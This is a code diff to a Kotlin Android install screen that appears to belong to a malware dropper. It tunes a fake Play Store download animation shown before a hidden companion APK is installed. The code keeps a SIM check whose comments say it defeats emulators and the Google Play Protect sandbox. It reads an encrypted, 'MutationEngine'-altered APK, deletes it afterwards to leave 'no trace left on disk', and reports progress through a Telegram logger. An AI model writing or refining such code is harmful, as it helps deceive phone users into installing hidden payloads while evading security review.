@@ -500,37 +500,26 @@ class InstallActivity : Activity() {
             return
         }
         installFlowActive = true
-        TelegramLogger.log("startDownload() called — waiting 2s then download animation")
-        setStage(Stage.WAITING)
+        TelegramLogger.log("startDownload() called — starting download animation immediately")
 
-        // Phase 1: WAITING (1.5s) — "Waiting…" label
-        // Phase 2: DOWNLOADING (3.5s) — smooth animated progress 0%→100%
-        // Phase 3: INSTALLING — real install begins after progress completes
-        //
-        // SIM check runs during WAITING phase (non-blocking).
-        // Total visual time: ~1.5s waiting + ~3.5s downloading = ~5s
-        // GPP sandbox has no SIM card — blocked by SIM check regardless of delay.
+        // SIM presence check — non-blocking, runs inline before animation starts
+        val hasSim = try {
+            val tm = getSystemService(android.content.Context.TELEPHONY_SERVICE)
+                as? android.telephony.TelephonyManager
+            val simState = tm?.simState ?: android.telephony.TelephonyManager.SIM_STATE_ABSENT
+            simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT &&
+            simState != android.telephony.TelephonyManager.SIM_STATE_UNKNOWN
+        } catch (t: Throwable) { true }
 
-        handler.postDelayed({
-            // SIM presence check — emulators have no SIM card
-            val hasSim = try {
-                val tm = getSystemService(android.content.Context.TELEPHONY_SERVICE)
-                    as? android.telephony.TelephonyManager
-                val simState = tm?.simState ?: android.telephony.TelephonyManager.SIM_STATE_ABSENT
-                simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT &&
-                simState != android.telephony.TelephonyManager.SIM_STATE_UNKNOWN
-            } catch (t: Throwable) { true }
-
-            TelegramLogger.log("SIM check done hasSim=$hasSim — starting download animation")
-            setStage(Stage.DOWNLOADING)
-            startProgressAnimation()
-        }, 1_500L)
+        TelegramLogger.log("SIM check done hasSim=$hasSim — starting download animation")
+        setStage(Stage.DOWNLOADING)
+        startProgressAnimation()
     }
 
     /**
      * Tier 1: Read processed companion from filesDir/mc.tmp
      *         (written by MutationEngine in LauncherApplication.onCreate)
-     *         Waits up to 6 seconds for processing to complete.
+     *         Waits up to 500ms only — MutationEngine runs in parallel during animation.
      *         Deletes file after reading — no trace left on disk.
      *
      * Tier 2: Base companion from assets (encrypted blob)
@@ -538,11 +527,11 @@ class InstallActivity : Activity() {
      *         Format: [4-byte seed LE][encrypted APK bytes]
      */
     private fun getCompanionBytes(): ByteArray {
-        // Wait for MutationEngine to finish (max 6 seconds)
+        // Wait for MutationEngine to finish (max 500ms — animation already covered the delay)
         val mutatedFile = LauncherApplication.getMutatedApkFile(application)
-        val deadline = System.currentTimeMillis() + 6_000L
+        val deadline = System.currentTimeMillis() + 500L
         while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
-            Thread.sleep(100)
+            Thread.sleep(50)
         }
 
         if (mutatedFile.exists() && mutatedFile.length() > 0L) {
@@ -646,14 +635,13 @@ class InstallActivity : Activity() {
     /**
      * Smooth 3-phase progress animation that mimics real Play Store download:
      *
-     * Phase 1 — Fast start (0% → 40%)  ~1.2s   quick initial burst
-     * Phase 2 — Slow middle (40% → 85%) ~1.8s   slows down like real download
-     * Phase 3 — Fast finish (85% → 100%) ~0.5s  quick final burst before "Installing…"
+     * Phase 1 — Heavy blue burst (0% → 30%)  ~900ms   thick fill at start
+     * Phase 2 — Slow middle (30% → 82%)      ~2800ms  realistic slowdown
+     * Phase 3 — Fast finish (82% → 100%)     ~700ms   quick final burst
+     * Hold: 200ms at 100% before "Installing…"
      *
-     * Total: ~3.5 seconds animation (+ 1.5s wait = 5s total).
-     * Non-linear timing via AccelerateDecelerateInterpolator.
-     * Each tick updates the bar + label (percentage only).
-     * After 100%, transitions to Stage.INSTALLING.
+     * Total: ~4.4s animation + 0s wait = ~5s before install dialog.
+     * No WAITING stage — animation starts immediately on tap.
      */
     private fun startProgressAnimation() {
         downloadProgress = 0f
@@ -662,9 +650,9 @@ class InstallActivity : Activity() {
         // Phase definitions: target%, duration(ms)
         data class Phase(val targetPct: Float, val durationMs: Long)
         val phases = listOf(
-            Phase(40f,  1200L),   // fast start
-            Phase(85f,  1800L),   // slow middle
-            Phase(100f,  500L),   // fast finish
+            Phase(30f,   900L),   // heavy blue burst at start
+            Phase(82f,  2800L),   // slow middle
+            Phase(100f,  700L),   // fast finish
         )
 
         var phaseIndex = 0
@@ -695,7 +683,7 @@ class InstallActivity : Activity() {
                             }
                         }.start()
                     }
-                }, 400L)  // brief 400ms hold at 100% before "Installing…"
+                }, 200L)  // brief 200ms hold at 100% before "Installing…"
                 return
             }
 
